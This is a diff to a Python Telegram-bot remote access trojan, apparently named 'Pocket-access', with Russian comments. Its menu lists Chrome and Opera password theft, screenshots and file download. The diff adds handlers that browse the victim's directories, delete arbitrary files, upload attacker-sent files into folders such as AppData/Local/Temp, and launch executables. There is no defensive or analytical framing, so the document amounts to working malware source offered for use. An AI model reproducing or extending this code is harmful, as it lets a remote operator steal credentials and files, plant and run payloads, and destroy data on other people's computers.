@@ -19,8 +19,8 @@ requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={cha
 @bot.message_handler(commands=['start', 'Start']) # Ждём команды Start / start
 def start(message):
     rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    btns = ["/Screen", "/ip", "/kill_process", "/Pwd", "/passwords chrome",
-            "/passwords opera", "/Open_url", "/Ls", "/Rm_dir", "/download_file", "/About"]
+    btns = ["/Screen", "/ip", "/delete_file", "/check_dir", "/passwords chrome",
+            "/passwords opera", "/Open_url", "/Ls", "/delete_file", "/download_file", "/unloud_file", "/start_process", "/About"]
 
     for btn in btns:
         rmk.add(types.KeyboardButton(btn))
@@ -44,16 +44,35 @@ def check_start(message):
     bot.send_message(message.chat.id, 'Ip: ' + s.getsockname()[0])
     s.close()
 
-@bot.message_handler(commands=['pwd', 'Pwd']) # ДИРЕКТОРИЯ
-def pwd(command) :
-    directory = os.path.abspath(os.getcwd()) # Получаем расположение
-    bot.send_message(chat_id, "Текущая дериктория: \n" + (str(directory))) # Отправляем сообщение
+@bot.message_handler(commands=['check_dir'])
+def check_start(message):
+    msg = bot.send_message(message.chat.id, 'Начем с начала в C: \n'+ str(os.listdir('C:/')) + '\n \n Введи следущюю директорию например C:/brawl/brawl.exe! Что-бы выйти пропиши /stop_dir')
+    bot.register_next_step_handler(msg, check_cotegory)
 
-@bot.message_handler(commands=["kill_process", "Kill_process"]) # ПРОЦЕССЫ
-def kill_process(message):
-    user_msg = "{0}".format(message.text) # Переменная в которой содержится сообщение
-    subprocess.call("taskkill /IM " + user_msg.split(" ")[1]) # Убиваем процесс по имени
-    bot.send_message(chat_id, "Готово!")
+def check_cotegory(message):
+    if(message.text ==  '/stop_dir'):
+        start(message)
+    else:
+        dir = message.text
+        try:
+            msg1 = bot.send_message(message.chat.id, 'В директории '+ dir +' есть: '+ str(os.listdir(dir)) + '\n \n Введи следущюю директорию ')
+            bot.register_next_step_handler(msg1, check_cotegory)
+        except:
+            msg1 = bot.send_message(message.chat.id, 'Даун! Такой директории нет, введи ещё раз дерикторю')
+            bot.register_next_step_handler(msg1, check_cotegory)
+
+@bot.message_handler(commands=['delete_file'])
+def isfile(message):
+    msg = bot.send_message(message.chat.id, 'Введи дерикторию файла например C:/jojo/jojo_1.exe')
+    bot.register_next_step_handler(msg, del_file)
+
+def del_file(message):
+    del_direct = message.text
+    try:
+        os.remove(del_direct)
+        bot.send_message(message.chat.id, 'Успешно! файл удален')
+    except:
+        bot.send_message(message.chat.id, 'Произошла ошибка')
 
 @bot.message_handler(commands=["ls", "Ls"]) # ВСЕ ФАЙЛЫ
 def ls_dir(commands):
@@ -90,15 +109,66 @@ def download_file(message):
     except:
         bot.send_message(message.chat.id, 'Даун, такого файла нет')
 
-@bot.message_handler(commands = ["Rm_dir", "rm_dir"]) # УДАЛИТЬ ПАПКУ
-def delete_dir(message):
-    user_msg = "{0}".format(message.text)
-    path2del = user_msg.split(" ")[1] # Переменная - имя папка
-    os.removedirs(path2del) # Удаляем папку
-    bot.send_message(chat_id, "Директория " + path2del + " удалена")
+@bot.message_handler(commands=['delete_file'])
+def isfile(message):
+    msg = bot.send_message(message.chat.id, 'Введи дерикторию файла например C:/jojo/jojo_1.exe')
+    bot.register_next_step_handler(msg, del_file)
+
+def del_file(message):
+    del_direct = message.text
+    try:
+        os.remove(del_direct)
+        bot.send_message(message.chat.id, 'Успешно! файл удален')
+    except:
+        bot.send_message(message.chat.id, 'Произошла ошибка')
+
+
+@bot.message_handler(commands=['unloud_file'])
+def unloud_file_wath_dir(message):
+    msg = bot.send_message(message.chat.id,
+                           'Введи дерикторию куда будут закачены файлы например C:/Users/Хуйня_зависит_от_пк/AppData/Local/Temp')
+    bot.register_next_step_handler(msg, unloud_file_wath_file)
+
+
+def unloud_file_wath_file(message):
+    global dirt
+    dirt = message.text
+    msg = bot.send_message(message.chat.id, 'Скинь файл')
+    bot.register_next_step_handler(msg, unloud_file)
+
+
+def unloud_file(message):
+    print(dirt)
+    dire = dirt
+    try:
+        chat_id = message.chat.id
+
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+
+        src = dire + '/' + message.document.file_name;
+        with open(src, 'wb') as new_file:
+            new_file.write(downloaded_file)
+
+        bot.reply_to(message, "Успешно! файл был сахронен в директории " + dire)
+    except Exception as e:
+        bot.reply_to(message, e)
+
+@bot.message_handler(commands=['start_process'])
+def check_start(message):
+    msg = bot.send_message(message.chat.id, 'Введи дерикторию exe-шника или имя процесса')
+    bot.register_next_step_handler(msg, start_process)
+
+def start_process(message):
+    dir_process = message.text
+    try:
+        os.startfile(dir_process)
+        bot.send_message(message.chat.id, 'Процесс успешно запущен')
+    except:
+        bot.send_message(message.chat.id, 'Даун, такого процесса или exe-шника нет!!!')
 
 @bot.message_handler(commands = ["About", "about"]) # ОПИСАНИЕ
 def about(commands):
-    bot.send_message(chat_id, "https://github.com/Dimitrescuu/60012")
+    bot.send_message(chat_id, "https://github.com/Dimitrescuu/Pocket-access")
 
 bot.polling()
